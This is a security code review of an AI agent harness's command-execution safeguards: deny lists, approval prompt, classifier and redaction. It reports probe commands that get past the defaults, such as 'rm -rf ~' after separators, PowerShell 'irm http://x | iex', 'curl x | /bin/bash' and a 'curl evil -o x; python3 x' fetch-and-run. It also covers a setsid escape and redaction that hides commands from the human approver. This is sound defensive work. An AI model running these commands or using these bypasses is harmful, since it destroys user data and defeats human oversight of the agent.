# Review: internal/tools, internal/agent, internal/provider

Date: 2026-09-29. Tree: `main` @ `e8b0b74`, clean. Read-only review.

Scope: `internal/tools` (exec, exec_unix/windows/linux, policy, deny_defaults,
approver, classifier, registry, fs, path_guard, web_fetch), `internal/agent`
(loop, history, prompt, events), `internal/provider` (+ `openai`, `mock`).

Baseline: `go vet` (linux and `GOOS=windows`) is clean, and
`go test -race -count=1` passes for all five packages. I ran every probe below
in a `git archive` copy under the session scratchpad. The working tree was not
touched.

I left out anything already fixed or accepted in
`fullstack-developer-260928-1041-final-review-fixes.md` and
`...-tools-policy-fixes.md`. I also left out the accepted `sh -c` / `eval` /
base64 bypasses, fs writes having no audit, and the Teredo and
`64:ff9b:1::/48` SSRF gaps. The same goes for quoting inside the command word
(`r''m`, `r\<newline>m`): docs/security.md already lists that as rephrasing.

## High

### H1. The default POSIX deny-list misses `rm -R`, `;rm`, `&&rm`, `|rm`, and backtick substitution
`internal/tools/deny_defaults.go:16-17`. The rm rules require
`(^|[;&|]\s|\s|\()` before `rm`, so a separator directly followed by `rm`
never matches. The short-flag class `[rf]` is also case-sensitive, so `-R`
(the POSIX recursive flag) does not match either. Probe output against
`DefaultDenyPOSIX` (refused=false means the command reaches the allow/mode
stage):

```
"rm -R ~/proj"      refused=false     "ls;rm -rf ~"       refused=false
"rm -Rv ~"          refused=false     "ls&&rm -rf ~"      refused=false
"echo `rm -rf ~`"   refused=false     "false||rm -rf ~"   refused=false
"true;'rm' -rf ~"   refused=false     "ls|rm -rf ~"       refused=false
```

`true;'rm' -rf ~` also shows that the deny normalization (which does handle
`;`) is undone by the rm rule's own boundary. docs/security.md says the list
catches "recursive/forced rm (short flags, long flags ...)". These are the
most ordinary shapes a model emits by accident. The consequence: in `auto`
mode the classifier becomes the only gate, and in `approval` mode a human
must catch the command. The documented "never prompts" guarantee is lost.
Confidence: **Confirmed by running**.
Fix (validated: `TestDenyCorpus*` still pass and all eight probes above are
refused):
```
`(^|[;&|(\x60]|\s)(/\S*/)?rm\s+([^|;&]*\s)?-[a-zA-Z]*[rRf]`,
`(^|[;&|(\x60]|\s)(/\S*/)?rm\s+([^|;&]*\s)?--(recursive|force)\b`,
```
Add these shapes to `mustCatchPOSIX`. Existing users keep their old
onboard-written list, so the fix needs a release note and possibly a `doctor`
hint.

### H2. The default Windows deny-list is written in cmd.exe syntax but runs under PowerShell, so the real PowerShell delete forms get through
`internal/tools/deny_defaults.go:36-38`. The default shell is
`powershell -NoProfile -Command` (`exec.go:168`). In PowerShell, `rm`, `ri`,
`del`, `erase`, `rd` and `rmdir` are all aliases of `Remove-Item`, and
parameters may be abbreviated (`-r`, `-Rec`, `-fo`). The list only matches the
full `Remove-Item -Recurse|-Force` form plus cmd.exe's `/s`, `/f` and `/q`
switches. Those switches do not even work in PowerShell: PowerShell treats
`/s` as a path. Probe output against `DefaultDenyWindows`:

```
"Remove-Item -r C:\x"  false   "rm -r -fo C:\Users\me"        false
"ri -Recurse C:\x"     false   "ls C:\x | rm -Recurse -Force" false
"del -Recurse C:\x"    false   "irm http://x | iex"           false
```

Confidence: **Confirmed by running** (regex level; I did not run this on a
Windows host).
Fix (validated against the probes above plus `Remove-Item foo.txt`,
`del build\out.txt`, `Remove-Item foo-rc.txt` and `docker rm -f x`, which all
stay unmatched):
```
`(?is)(^|[;&|(\s])(remove-item|ri|rm|rmdir|rd|del|erase)(\s[^|;&]*)?\s-(r|fo)[a-z]*\b`
```
Also add `irm|invoke-restmethod` to the two `iex` rules.

### H3. One malformed tool-call `arguments` string loses the whole turn, including tool side effects that already ran
`internal/provider/openai/chat.go:163` stores `tc.Function.Arguments` as
`json.RawMessage` without validating it. `store.FromProviderMessage`
(`internal/store/types.go:78`) then calls `json.Marshal` on the tool calls.
For a `RawMessage` that is not valid JSON, that call fails. `Loop.flush`
(`internal/agent/loop.go:432-434`) aborts before `Append`, so none of the
turn's rows are written.

Scenario: the model's output hits the token cap partway through a tool call
(`{"command": "ls`). Other triggers are a llama.cpp or vLLM backend emitting
single-quoted pseudo-JSON, or an empty `""` argument string. The tool still
runs and gets `invalid arguments`, and the model recovers. Probe result for
`{"command": "ls`, `""` and `{'command': 'ls'}`:

```
text="sorry, fixed" err=agent: encode message ...: store: encode tool_calls:
json: error calling MarshalJSON ...: unexpected end of JSON input persisted_rows=0
```

Every earlier exec or write_file call in that turn has already happened. Only
exec_audit remembers them. The next turn has no record of any of it, which is
the "crash loses side effects" exposure from docs/security.md, triggered with
no crash. Confidence: **Confirmed by running**.
Fix: in `fromSDK`, if `!json.Valid(args)`, store a valid JSON encoding of the
raw text, such as `json.Marshal(string(raw))`. The registry then reports
`invalid arguments` exactly as before, and the turn stays persistable. Add a
loop test that feeds invalid args through `mock` and asserts the rows are
persisted.

## Medium

### M1. Redaction can replace the command word itself with `[REDACTED]` in the approval prompt and in exec_audit
`internal/tools/approver.go:375,377,381`. Three separators in
`redactPatterns` can match across a command boundary. The metacharacter-safe
value class does not help here:
- `--secret\S*[= ]`: `\S*` swallows `;`.
- `bearer\s+` and `authorization:\s*`: `\s` matches a newline.

Probe output (after `displayCommand`):

```
"echo --secret; bash /tmp/x.sh"            -> "echo --secret; [REDACTED] /tmp/x.sh"
"echo Bearer\nshred -u ~/important.db"     -> "echo Bearer\n[REDACTED] -u ~/important.db"
"echo authorization:\nbash /tmp/payload"   -> "echo authorization:\n[REDACTED] /tmp/payload"
```

The human approves what looks like a hidden token. The forensic record has
lost the program name too. This is the same class as the fixed B1: the fix
bounded the value but not the key/separator part. Confidence:
**Confirmed by running**.
Fix: `--secret[A-Za-z0-9_-]*[= ]`, `bearer[ \t]+`, and
`authorization:[ \t]*`. Extend `TestRedactSecrets_NeverSwallowsShellMetacharacters`
so that no whitespace-delimited word right after `;`, `&`, `|` or a newline is
ever redacted.

### M2. A single turn longer than `max_history_turns*8` messages wipes all history from the next turn
`internal/agent/loop.go:305` fetches `Recent(maxTurns*8)` messages. If the
newest turn alone exceeds that window, the window starts partway through the
turn. `dropLeadingNonUser` (`history.go:59,131-138`) then finds no user
message and returns nil. The next request carries only the system prompt and
the new user message.

Probe: `max_history_turns: 2` (the validated minimum) and a 10-iteration tool
turn. The next request had 2 messages, and the fact asked about was gone. With
defaults (40 turns, so a 320-message window) this takes more than 320
messages. That is reachable under the allowed `max_iterations: 100` with 3
parallel tool calls per step. Confidence: **Confirmed by running**.
Fix: when the result starts partway through a turn and the fetch returned the
full limit, widen the fetch and retry (double it, bounded). The final result
is capped by `TrimToByteBudget` anyway. Alternatively, give the store a
"messages since the Nth-last user row" query.

### M3. The cancellation note says "already happened" about exec results that were killed or refused
`internal/agent/loop.go:217-219` appends
`[turn canceled right after this tool call completed - the result above is
real and already happened]` whenever `ctx.Err() != nil && result != ""`. The
exec tool returns a non-empty result on paths where nothing completed:
- `exec.go:382` `"exec: command canceled because the turn ended"` with
  `ctx.Err()`: the process was SIGKILLed partway through.
- `ask()` `"no approval decision was reached ... command refused"`: the
  registry wraps it with `ctx.Err()`.
- web_fetch `"request failed: context canceled"`.

Probe of the exec shape; the persisted tool row reads:
`"exec: command canceled because the turn ended\n\n[turn canceled right after
this tool call completed - the result above is real and already happened]"`.
The durable history now claims that a half-run or never-run command
completed. The L4 fix was meant to prevent exactly this kind of confusion.
Confidence: **Confirmed by running**.
Fix: make the note describe only what is known: "[the turn was canceled as
this tool call returned; the text above is what the tool reported]". Or have
exec's canceled path return `""` so the plain failure line is used.

## Low

- **L1. Other default-deny gaps.** `deny_defaults.go:24-26`. None of these is
  refused: `git push -fu origin main` (`-f)\b` requires a boundary after `f`),
  `git push origin +main` (force refspec), `git -C . push -f`,
  `chmod 777 -R /`, `curl x | /bin/bash`. **Confirmed by running.** Fix:
  `\bgit\b.*\bpush\b.*(\s--force(-with-lease)?\b|\s-[a-zA-Z]*f|\s\+\S)`,
  `chmod\b.*\b777\s+(-R\s+)?/`, and `(/\S*/)?(sudo\s+)?(ba|z|da)?sh\b`.
- **L2. A `setsid` child escapes the "always kill the tree" guarantee.**
  `exec.go:286-288,350-353` says a backgrounded child "never outlives this
  call", but `exec_unix.go:35-37` kills only the process group. Probe:
  `setsid sh -c 'sleep 2; touch M' >/dev/null 2>&1 </dev/null & echo started;
  sleep 0.5` returned `exit_code: 0`, and marker `M` appeared later. The child
  survived. **Confirmed by running.** This is not a sandbox, so the fix is to
  reword the comments as "the process group", and optionally to add this
  limit to docs/security.md.
- **L3. Classifier categories are case-sensitive, so `confirm_on` fails
  open.** `policy.go:202-208`. `Risk` is validated strictly (`classifier.go`
  line 107, so `"High"` fails closed to ask), but `Categories` is not.
  `{"risk":"low","categories":["Destructive"]}` returns `VerdictRun` with the
  default `confirm_on`. **Confirmed by reading.** Fix: lowercase and trim each
  category before the lookup, or treat any unknown category as a hit.
- **L4. `write_file` reports success without checking `Close`.** `fs.go:231-233`.
  Deferring `file.Close()` discards write-back errors (NFS, quota, ENOSPC
  surfacing at close), yet the tool returns `wrote N bytes`. **Confirmed by
  reading.** Fix: close explicitly and return its error.
- **L5. The allow-list comment presents a loose pattern as tight.**
  `policy.go:95-99`. It says `^npm run .+$` "permit[s] exactly one tight
  command". But `.` matches `;`, `&` and `|`, so
  `npm run build; curl evil -o x; python3 x` runs with no prompt. Deny still
  applies to the rest. **Confirmed by reading (regex semantics).** Fix: use
  `^npm run [\w:.-]+$` in the comment, and add a one-line warning to the
  `tools.exec.allow` docs row.
- **L6. A one-element `tools.exec.shell` is accepted silently.** `exec.go:297`.
  With `shell: [/bin/bash]`, the command is passed as `argv[1]`, and bash
  treats it as a script path (`bash: ls -la: No such file or directory`) for
  every command. `config.Validate` does not check the length. **Confirmed by
  reading.** Fix: validate `len(shell) >= 2` when shell is non-empty, or
  document the rule.
- **L7. Common credential shapes are not redacted.** URL userinfo
  (`https://admin:hunter2@host`), `ghs_` / `gho_` / `github_pat_` tokens, and
  `X-Api-Key: value` headers all pass through `RedactSecrets` unchanged.
  **Confirmed by running.** Redaction is documented as best-effort, but URL
  userinfo is the most common inline-credential shape in `git clone` and
  `curl`. Fix: add a `://[^/\s:@]+:(value)@` rule and a `gh[pousr]_` token
  rule.
- **L8. Windows: a grandchild spawned before `AssignProcessToJobObject` is
  outside the job.** `exec_windows.go:41-68`. The job is assigned after
  `Start`, and PowerShell can spawn a child in that window; that child is then
  outside the kill-on-close job. **Plausible (not run on Windows).** Fix:
  start suspended (`CREATE_SUSPENDED`), assign, then resume. Or document it as
  best-effort.
- **L9. Model refusals and content-filter stops become a silent non-reply.**
  `openai/chat.go:147-174` ignores `ChatCompletionMessage.Refusal`, and
  `loop.go:271-283` handles only `finish_reason: "length"`. A refusal, or a
  `content_filter` stop (common on Azure), gives `Text == ""`, and
  `gateway.reply` returns without sending anything. **Confirmed by reading**
  (SDK v3.49 field and `dispatch.go`). Fix: use `Refusal` when `Content` is
  empty, and add a `content_filter` notice next to the `length` notice.

## Cleanup (below real defects)

- `policy.go:172,179,191,199,215`: `Decision.Audit = "approval"` on every
  `VerdictAsk` path is never read, because `ask` writes its own labels. Drop
  it, or document it as unused for Ask.
- `approver.go:44-48`: the `Approver` doc still tells callers to propagate
  `context.Canceled`. `ask` intentionally does not, and `Registry.Run` does it
  instead. Update the comment.
- `approver.go:87-90`: "never parked mid-send" is false once more than 8
  lines are queued. The drain is best-effort; say so.
- `web_fetch.go:230-233`: truncation is a raw byte cut. `exec` and
  `read_file` use `runeSafeLen`; reuse it here. A cut in the middle of an HTML
  tag also leaks the partial tag text past `tagRe`.
- `fs.go:321`: `os.ReadDir` reads the whole directory before the 2000-entry
  cap applies. `f.ReadDir(listDirEntryCap - *count)` would bound memory.
- `policy.go:86` and `exec.go:133`: `ResolveShell` is computed twice from the
  same config. Pass `policy.shell` to `execTool`.

## Test gaps on risky behavior

- The deny corpus (`policy_test.go:222-258,348-365`) has no `rm -R`, no
  no-space separator, no backtick, no PowerShell alias, and no abbreviated
  parameter (H1, H2).
- No test covers an invalid-JSON tool-call argument surviving `flush` (H3).
- No redaction property test covers the key or separator side crossing
  `;` or a newline (M1).
- No `loadHistory` test covers one turn larger than the `Recent` window (M2).

## Verified non-issues

- **The Windows fallback kill still works when `trackProcessTree` returns nil.**
  With a custom `Cancel`, os/exec still calls `Process.Kill` once `WaitDelay`
  elapses after ctx ends, so the direct child is always reaped within 3s.
- **The unix post-Wait `kill(-pgid)` cannot hit a reused pid.** Linux does not
  recycle a pid number while it is still some process group's id. Once the
  group is empty the call returns ESRCH, or at worst targets a new group
  leader that happened to get the same number, which is negligible.
- **`trackedProcessTree`**: the set/kill handoff and the `sync.Once` are
  race-free (`-race` is green). A kill before `set` does not consume the Once.
- **The deny check runs first on both the raw and normalized strings**, and
  both allow and deny see the trimmed raw command. Allow-list rules do not use
  `(?s)`, so `.+$` cannot span a newline.
- **Path guard**: `..` is cleaned first, and the deepest existing ancestor has
  its symlinks resolved. A dangling symlink errors. Containment uses
  `Rel`-based checks, and FIFO and device targets are refused before `Open`.
- **web_fetch**: the dial `Control` hook sees every resolved IP on every hop.
  No proxy is set. The Content-Type gate runs before the body is read, and the
  `LimitReader` applies after gzip decoding.
- **`provider.Classify` and `openai.classify` put ctx first**, so an
  `http.Client.Timeout` is transient, not canceled. The numeric `"code": 400`
  message fallback is still in place.
- **`Registry.Run`'s ctx-ended contract, and the loop's backfill and abort
  paths**, keep one tool row per call id in every exit path I traced.

## Unresolved questions

1. H1 and H2 change onboard defaults only. Should `doctor` flag an existing
   config whose deny list lacks the new rm and Remove-Item forms, or is a
   release note enough?
2. H3: should flush instead persist the rows it can encode (degrading one bad
   message) rather than normalizing in the provider? Normalizing at the
   provider boundary is simpler and keeps the atomic-turn guarantee.
